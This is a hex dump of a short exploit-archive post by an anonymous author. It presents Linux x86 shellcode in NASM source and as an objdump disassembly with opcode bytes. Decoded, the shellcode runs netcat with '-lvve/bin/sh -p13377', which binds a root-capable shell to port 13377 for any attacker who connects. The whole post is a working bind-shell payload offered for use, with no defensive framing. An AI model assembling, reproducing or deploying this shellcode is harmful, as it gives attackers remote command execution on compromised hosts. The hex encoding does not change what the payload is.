00000000  6c 69 6e 75 78 20 78 38  36 20 6e 63 20 2d 6c 76  |linux x86 nc -lv|
00000010  76 65 2f 62 69 6e 2f 73  68 20 2d 70 31 33 33 37  |ve/bin/sh -p1337|
00000020  37 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 54 68 69  |7 shellcode..Thi|
00000030  73 20 73 68 65 6c 6c 63  6f 64 65 20 77 69 6c 6c  |s shellcode will|
00000040  20 6c 69 73 74 65 6e 20  6f 6e 20 70 6f 72 74 20  | listen on port |
00000050  31 33 33 37 37 20 75 73  69 6e 67 20 6e 65 74 63  |13377 using netc|
00000060  61 74 20 61 6e 64 20 67  69 76 65 20 2f 62 69 6e  |at and give /bin|
00000070  2f 73 68 20 74 6f 20 63  6f 6e 6e 65 63 74 69 6e  |/sh to connectin|
00000080  67 20 61 74 74 61 63 6b  65 72 0d 0a 41 75 74 68  |g attacker..Auth|
00000090  6f 72 3a 20 41 6e 6f 6e  79 6d 6f 75 73 0d 0a 53  |or: Anonymous..S|
000000a0  69 74 65 3a 20 68 74 74  70 3a 2f 2f 63 68 61 6f  |ite: http://chao|
000000b0  73 73 65 63 75 72 69 74  79 2e 77 6f 72 64 70 72  |ssecurity.wordpr|
000000c0  65 73 73 2e 63 6f 6d 2f  0d 0a 48 65 72 65 20 69  |ess.com/..Here i|
000000d0  73 20 63 6f 64 65 20 77  72 69 74 74 65 6e 20 69  |s code written i|
000000e0  6e 20 4e 41 53 4d 0d 0a  2f 2f 2f 2f 2f 2f 2f 2f  |n NASM..////////|
000000f0  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |////////////////|
00000100  2f 2f 2f 2f 2f 0d 0a 73  65 63 74 69 6f 6e 20 2e  |/////..section .|
00000110  74 65 78 74 0d 0a 20 20  20 20 67 6c 6f 62 61 6c  |text..    global|
00000120  20 5f 73 74 61 72 74 0d  0a 5f 73 74 61 72 74 3a  | _start.._start:|
00000130  0d 0a 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 78  |..xor eax,eax..x|
00000140  6f 72 20 65 64 78 2c 65  64 78 0d 0a 70 75 73 68  |or edx,edx..push|
00000150  20 30 78 33 37 33 37 33  33 33 33 0d 0a 70 75 73  | 0x37373333..pus|
00000160  68 20 30 78 33 31 37 30  37 36 32 64 0d 0a 6d 6f  |h 0x3170762d..mo|
00000170  76 20 65 64 78 2c 20 65  73 70 0d 0a 70 75 73 68  |v edx, esp..push|
00000180  20 65 61 78 0d 0a 70 75  73 68 20 30 78 36 38 37  | eax..push 0x687|
00000190  33 32 66 36 65 0d 0a 70  75 73 68 20 30 78 36 39  |32f6e..push 0x69|
000001a0  36 32 32 66 36 35 0d 0a  70 75 73 68 20 30 78 37  |622f65..push 0x7|
000001b0  36 37 36 36 63 32 64 0d  0a 6d 6f 76 20 65 63 78  |6766c2d..mov ecx|
000001c0  2c 65 73 70 0d 0a 70 75  73 68 20 65 61 78 0d 0a  |,esp..push eax..|
000001d0  70 75 73 68 20 30 78 36  33 36 65 32 66 32 66 0d  |push 0x636e2f2f.|
000001e0  0a 70 75 73 68 20 30 78  32 66 32 66 32 66 32 66  |.push 0x2f2f2f2f|
000001f0  0d 0a 70 75 73 68 20 30  78 36 65 36 39 36 32 32  |..push 0x6e69622|
00000200  66 0d 0a 6d 6f 76 20 65  62 78 2c 20 65 73 70 0d  |f..mov ebx, esp.|
00000210  0a 70 75 73 68 20 65 61  78 0d 0a 70 75 73 68 20  |.push eax..push |
00000220  65 64 78 0d 0a 70 75 73  68 20 65 63 78 0d 0a 70  |edx..push ecx..p|
00000230  75 73 68 20 65 62 78 0d  0a 78 6f 72 20 65 64 78  |ush ebx..xor edx|
00000240  2c 65 64 78 0d 0a 6d 6f  76 20 20 65 63 78 2c 65  |,edx..mov  ecx,e|
00000250  73 70 0d 0a 6d 6f 76 20  61 6c 2c 31 31 0d 0a 69  |sp..mov al,11..i|
00000260  6e 74 20 30 78 38 30 0d  0a 2f 2f 2f 2f 2f 2f 2f  |nt 0x80..///////|
00000270  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |////////////////|
00000280  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 0d 0a 41 6e 64  |///////////..And|
00000290  20 68 65 72 65 20 69 73  20 6f 62 6a 64 75 6d 70  | here is objdump|
000002a0  20 66 72 6f 6d 20 77 68  69 63 68 20 79 6f 75 20  | from which you |
000002b0  63 61 6e 20 73 65 65 20  74 68 65 20 73 68 65 6c  |can see the shel|
000002c0  6c 63 6f 64 65 0d 0a 2f  2f 2f 2f 2f 2f 2f 2f 2f  |lcode../////////|
000002d0  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |////////////////|
000002e0  2f 2f 2f 2f 2f 2f 2f 2f  2f 0d 0a 74 65 6f 40 74  |/////////..teo@t|
000002f0  65 6f 2d 64 65 73 6b 74  6f 70 20 7e 20 24 20 6f  |eo-desktop ~ $ o|
00000300  62 6a 64 75 6d 70 20 2d  64 20 61 2e 6f 75 74 0d  |bjdump -d a.out.|
00000310  0a 61 2e 6f 75 74 3a 20  20 20 20 20 66 69 6c 65  |.a.out:     file|
00000320  20 66 6f 72 6d 61 74 20  65 6c 66 33 32 2d 69 33  | format elf32-i3|
00000330  38 36 0d 0a 44 69 73 61  73 73 65 6d 62 6c 79 20  |86..Disassembly |
00000340  6f 66 20 73 65 63 74 69  6f 6e 20 2e 74 65 78 74  |of section .text|
00000350  3a 0d 0a 30 38 30 34 38  30 36 30 20 3c 2e 74 65  |:..08048060 <.te|
00000360  78 74 3e 3a 0d 0a 20 38  30 34 38 30 36 30 3a 20  |xt>:.. 8048060: |
00000370  20 20 33 31 20 63 30 20  20 20 20 20 20 20 20 20  |  31 c0         |
00000380  20 20 20 20 20 20 20 20  20 20 78 6f 72 20 20 20  |          xor   |
00000390  20 25 65 61 78 2c 25 65  61 78 0d 0a 20 38 30 34  | %eax,%eax.. 804|
000003a0  38 30 36 32 3a 20 20 20  33 31 20 64 32 20 20 20  |8062:   31 d2   |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003c0  78 6f 72 20 20 20 20 25  65 64 78 2c 25 65 64 78  |xor    %edx,%edx|
000003d0  0d 0a 20 38 30 34 38 30  36 34 3a 20 20 20 36 38  |.. 8048064:   68|
000003e0  20 33 33 20 33 33 20 33  37 20 33 37 20 20 20 20  | 33 33 37 37    |
000003f0  20 20 20 20 20 20 70 75  73 68 20 20 20 24 30 78  |      push   $0x|
00000400  33 37 33 37 33 33 33 33  0d 0a 20 38 30 34 38 30  |37373333.. 80480|
00000410  36 39 3a 20 20 20 36 38  20 32 64 20 37 36 20 37  |69:   68 2d 76 7|
00000420  30 20 33 31 20 20 20 20  20 20 20 20 20 20 70 75  |0 31          pu|
00000430  73 68 20 20 20 24 30 78  33 31 37 30 37 36 32 64  |sh   $0x3170762d|
00000440  0d 0a 20 38 30 34 38 30  36 65 3a 20 20 20 38 39  |.. 804806e:   89|
00000450  20 65 32 20 20 20 20 20  20 20 20 20 20 20 20 20  | e2             |
00000460  20 20 20 20 20 20 6d 6f  76 20 20 20 20 25 65 73  |      mov    %es|
00000470  70 2c 25 65 64 78 0d 0a  20 38 30 34 38 30 37 30  |p,%edx.. 8048070|
00000480  3a 20 20 20 35 30 20 20  20 20 20 20 20 20 20 20  |:   50          |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000004a0  20 20 20 25 65 61 78 0d  0a 20 38 30 34 38 30 37  |   %eax.. 804807|
000004b0  31 3a 20 20 20 36 38 20  36 65 20 32 66 20 37 33  |1:   68 6e 2f 73|
000004c0  20 36 38 20 20 20 20 20  20 20 20 20 20 70 75 73  | 68          pus|
000004d0  68 20 20 20 24 30 78 36  38 37 33 32 66 36 65 0d  |h   $0x68732f6e.|
000004e0  0a 20 38 30 34 38 30 37  36 3a 20 20 20 36 38 20  |. 8048076:   68 |
000004f0  36 35 20 32 66 20 36 32  20 36 39 20 20 20 20 20  |65 2f 62 69     |
00000500  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 36  |     push   $0x6|
00000510  39 36 32 32 66 36 35 0d  0a 20 38 30 34 38 30 37  |9622f65.. 804807|
00000520  62 3a 20 20 20 36 38 20  32 64 20 36 63 20 37 36  |b:   68 2d 6c 76|
00000530  20 37 36 20 20 20 20 20  20 20 20 20 20 70 75 73  | 76          pus|
00000540  68 20 20 20 24 30 78 37  36 37 36 36 63 32 64 0d  |h   $0x76766c2d.|
00000550  0a 20 38 30 34 38 30 38  30 3a 20 20 20 38 39 20  |. 8048080:   89 |
00000560  65 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e1              |
00000570  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 73 70  |     mov    %esp|
00000580  2c 25 65 63 78 0d 0a 20  38 30 34 38 30 38 32 3a  |,%ecx.. 8048082:|
00000590  20 20 20 35 30 20 20 20  20 20 20 20 20 20 20 20  |   50           |
000005a0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
000005b0  20 20 25 65 61 78 0d 0a  20 38 30 34 38 30 38 33  |  %eax.. 8048083|
000005c0  3a 20 20 20 36 38 20 32  66 20 32 66 20 36 65 20  |:   68 2f 2f 6e |
000005d0  36 33 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |63          push|
000005e0  20 20 20 24 30 78 36 33  36 65 32 66 32 66 0d 0a  |   $0x636e2f2f..|
000005f0  20 38 30 34 38 30 38 38  3a 20 20 20 36 38 20 32  | 8048088:   68 2|
00000600  66 20 32 66 20 32 66 20  32 66 20 20 20 20 20 20  |f 2f 2f 2f      |
00000610  20 20 20 20 70 75 73 68  20 20 20 24 30 78 32 66  |    push   $0x2f|
00000620  32 66 32 66 32 66 0d 0a  20 38 30 34 38 30 38 64  |2f2f2f.. 804808d|
00000630  3a 20 20 20 36 38 20 32  66 20 36 32 20 36 39 20  |:   68 2f 62 69 |
00000640  36 65 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |6e          push|
00000650  20 20 20 24 30 78 36 65  36 39 36 32 32 66 0d 0a  |   $0x6e69622f..|
00000660  20 38 30 34 38 30 39 32  3a 20 20 20 38 39 20 65  | 8048092:   89 e|
00000670  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
00000680  20 20 20 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  |    mov    %esp,|
00000690  25 65 62 78 0d 0a 20 38  30 34 38 30 39 34 3a 20  |%ebx.. 8048094: |
000006a0  20 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |  50            |
000006b0  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
000006c0  20 25 65 61 78 0d 0a 20  38 30 34 38 30 39 35 3a  | %eax.. 8048095:|
000006d0  20 20 20 35 32 20 20 20  20 20 20 20 20 20 20 20  |   52           |
000006e0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
000006f0  20 20 25 65 64 78 0d 0a  20 38 30 34 38 30 39 36  |  %edx.. 8048096|
00000700  3a 20 20 20 35 31 20 20  20 20 20 20 20 20 20 20  |:   51          |
00000710  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000720  20 20 20 25 65 63 78 0d  0a 20 38 30 34 38 30 39  |   %ecx.. 804809|
00000730  37 3a 20 20 20 35 33 20  20 20 20 20 20 20 20 20  |7:   53         |
00000740  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000750  68 20 20 20 25 65 62 78  0d 0a 20 38 30 34 38 30  |h   %ebx.. 80480|
00000760  39 38 3a 20 20 20 33 31  20 64 32 20 20 20 20 20  |98:   31 d2     |
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00000780  72 20 20 20 20 25 65 64  78 2c 25 65 64 78 0d 0a  |r    %edx,%edx..|
00000790  20 38 30 34 38 30 39 61  3a 20 20 20 38 39 20 65  | 804809a:   89 e|
000007a0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000007b0  20 20 20 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  |    mov    %esp,|
000007c0  25 65 63 78 0d 0a 20 38  30 34 38 30 39 63 3a 20  |%ecx.. 804809c: |
000007d0  20 20 62 30 20 30 62 20  20 20 20 20 20 20 20 20  |  b0 0b         |
000007e0  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
000007f0  20 24 30 78 62 2c 25 61  6c 0d 0a 20 38 30 34 38  | $0xb,%al.. 8048|
00000800  30 39 65 3a 20 20 20 63  64 20 38 30 20 20 20 20  |09e:   cd 80    |
00000810  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |               i|
00000820  6e 74 20 20 20 20 24 30  78 38 30                 |nt    $0x80|
0000082b
